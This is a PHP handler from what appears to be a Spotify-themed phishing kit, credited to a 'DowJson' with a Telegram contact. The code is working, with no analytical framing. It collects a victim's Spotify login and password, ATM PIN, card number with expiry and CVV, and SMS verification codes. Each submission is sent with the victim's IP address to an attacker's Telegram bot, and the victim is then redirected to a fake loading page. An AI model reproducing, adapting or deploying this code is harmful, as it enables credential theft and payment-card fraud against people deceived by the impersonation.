<?php

    /*===================================================
    += Collected by: DowJson
    -----------------------------------------------------
    += Contact me on telegram : https://t.me/DowJson 
    +===================================================*/

    session_start();


    include "config.php";
    

    if(isset($_POST["log"])){

        $x1    = $_POST["log"];
        $x2    = $_POST["pass"];

        $message=
        '[SPOTIFY] => LOGIN'."\n".     
        '- LOGIN : '.$x1."\n".
        '- PASSWORD : '.$x2."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        'Link Panel : '.get_steps_link()."\n";    

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        header("Location: ../../../loading.php");
        reset_data();

    }elseif(isset($_POST["pin"])){

        $sms      = $_POST["pin"];

        $message=
        '[SPOTIFY] => PIN'."\n".     
        '- PIN ATM : '.$sms."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        'Link Panel : '.get_steps_link()."\n";

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }elseif(isset($_POST["confirm"])){

        $sms      = $_POST["confirm"];

        $message=
        '[SPOTIFY] => CONFIRMED'."\n".     
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        'Link Panel : '.get_steps_link()."\n";

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }elseif(isset($_POST["card"])){
        $number   = $_POST["cc"];
        $exp      = $_POST["exp"];
        $cvv      = $_POST["cvv"];
        $n = $string = str_replace(' ', '', $_POST["cc"]);
        $message=
        '[SPOTIFY ES] => CARD'."\n".     
        '- Card Number : '.$number."\n".
        '- Exp : '.$exp."\n".
        '- Cvv : '.$cvv."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        'Link Panel : '.get_steps_link()."\n".
        '- Type : '.'https://cardimages.imaginecurve.com/cards/'.substr($n,0,6).'.png'."\n";        
        
        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();

    }elseif(isset($_POST["sms"])){

        $sms      = $_POST["sms"];

        $message=
        '[SPOTIFY] => SMS'."\n".     
        '- SMS : '.$sms."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        'Link Panel : '.get_steps_link()."\n";

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    } elseif(isset($_POST["sms1"])){

        $sms      = $_POST["sms1"];

        $message=
        '[SPOTIFY] => SMS'."\n".     
        '- SMS : '.$sms."\n".
        '- IP : '.$_SERVER['REMOTE_ADDR']."\n".
        'Link Panel : '.get_steps_link()."\n";

        sendTelegramMessage(BOT_TOKEN, CHAT_ID, $message);
        reset_data();
        header("Location: ../../../loading.php");
        exit();        
 
    }

?>